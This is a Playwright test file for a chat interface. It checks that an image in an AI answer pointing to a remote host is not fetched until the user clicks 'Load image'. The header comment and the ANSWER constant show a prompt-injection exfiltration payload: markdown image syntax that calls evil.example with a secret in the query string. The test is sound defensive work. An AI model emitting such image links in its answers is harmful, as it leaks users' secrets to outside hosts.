/**
 * chat-remote-images.spec.ts — P0.11 (T24/T25)
 *
 * A prompt-injected answer containing `![x](https://evil.example/?d=<secret>)`
 * must not make the browser fetch that URL when the answer renders. The
 * image loads only after the user clicks "Load image".
 *
 * Chat APIs are mocked with page.route() like chat-streaming.spec.ts, but the
 * `authenticated` project still signs in through the real backend first
 * (`setup/`), so this needs the usual e2e environment (see tests/e2e/README.md):
 *
 *   npx playwright test tests/e2e/chat/chat-remote-images.spec.ts --project=authenticated
 *
 * CI relies on the vitest component tests for the same cases
 * (answer-content.remote-images.test.tsx, safe-markdown-image.test.tsx).
 */

import type { Page } from '@playwright/test';
import { test, expect } from '../fixtures/base.fixture';
import { buildAguiConversation, buildAguiSseBody } from './agui-sse-builder';

const CONV_ID = 'conv-e2e-remote-img-001';
const QUESTION = 'Summarise the onboarding doc';
const EVIL_HOST = 'evil.example';
const EVIL_URL = `https://${EVIL_HOST}/p.png?d=secret-token`;
const ANSWER = `Here is the summary.\n\n![status](${EVIL_URL})\n\nDone.`;
const MODEL_INFO = {
  modelKey: 'gpt-4o-mini',
  modelName: 'GPT-4o mini',
  chatMode: 'internal_search',
  modelFriendlyName: 'GPT-4o mini',
};

async function mockChat(page: Page) {
  await page.route('**/api/v1/configurationManager/ai-models/available/llm', (route) =>
    route.fulfill({
      status: 200,
      contentType: 'application/json',
      body: JSON.stringify({
        status: 'success',
        models: [{ ...MODEL_INFO, modelType: 'chat', provider: 'openAI', isMultimodal: false, isReasoning: false, isDefault: true }],
        message: 'Success',
      }),
    }),
  );
  await page.route('**/api/v1/conversations*', (route) =>
    route.request().method() === 'GET'
      ? route.fulfill({
          status: 200,
          contentType: 'application/json',
          body: JSON.stringify({
            conversations: [],
            source: 'owned',
            pagination: { page: 1, limit: 20, totalCount: 0, totalPages: 0, hasNextPage: false, hasPrevPage: false },
          }),
        })
      : route.continue(),
  );
  await page.route('**/api/v1/users/by-ids', (route) =>
    route.request().method() === 'POST'
      ? route.fulfill({ status: 200, contentType: 'application/json', body: '[]' })
      : route.fallback(),
  );
  const conversation = buildAguiConversation({
    conversationId: CONV_ID,
    userMessageId: 'msg-user-remote-img',
    botMessageId: 'msg-bot-remote-img',
    question: QUESTION,
    answer: ANSWER,
    modelInfo: MODEL_INFO,
  });
  await page.route(
    (url) => url.pathname.replace(/\/$/, '') === `/api/v1/conversations/${CONV_ID}`,
    (route) =>
      route.request().method() === 'GET'
        ? route.fulfill({
            status: 200,
            contentType: 'application/json',
            body: JSON.stringify({
              conversation: { ...conversation, id: CONV_ID, access: { isOwner: true, accessLevel: 'OWNER' } },
              filters: {},
              meta: {},
            }),
          })
        : route.fallback(),
  );
  await page.route('**/api/v1/conversations/stream', (route) =>
    route.request().method() === 'POST'
      ? route.fulfill({
          status: 200,
          headers: { 'Content-Type': 'text/event-stream', 'Cache-Control': 'no-cache' },
          body: buildAguiSseBody({
            conversationId: CONV_ID,
            userMessageId: 'msg-user-remote-img',
            botMessageId: 'msg-bot-remote-img',
            question: QUESTION,
            answer: ANSWER,
            modelInfo: MODEL_INFO,
            requestId: 'req-remote-img',
          }),
        })
      : route.continue(),
  );
}

test.describe('Chat — remote images in answers (P0.11)', () => {
  test('a remote image is not fetched until the user clicks "Load image"', async ({ page }) => {
    const evilHits: string[] = [];
    await page.route(`https://${EVIL_HOST}/**`, (route) => {
      evilHits.push(route.request().url());
      return route.fulfill({ status: 200, contentType: 'image/png', body: Buffer.from([]) });
    });
    await mockChat(page);

    await page.goto('/chat/');
    const textarea = page.locator('textarea').last();
    await textarea.waitFor({ timeout: 15_000 });
    await textarea.fill(QUESTION);
    await textarea.press('Enter');

    // T24: placeholder shows the host; no <img> with that src; no request.
    const loadButton = page.getByRole('button', { name: `Load image from ${EVIL_HOST}` });
    await expect(loadButton.first()).toBeVisible({ timeout: 20_000 });
    await expect(page.getByText(`Image from ${EVIL_HOST} not loaded`).first()).toBeVisible();
    await expect(page.locator(`img[src*="${EVIL_HOST}"]`)).toHaveCount(0);
    await page.waitForTimeout(500);
    expect(evilHits).toEqual([]);

    // T25: the click is the consent; the image renders and is fetched once.
    await loadButton.first().click();
    await expect(page.locator(`img[src="${EVIL_URL}"]`)).toHaveCount(1);
    await expect.poll(() => evilHits.length).toBeGreaterThan(0);
  });
});
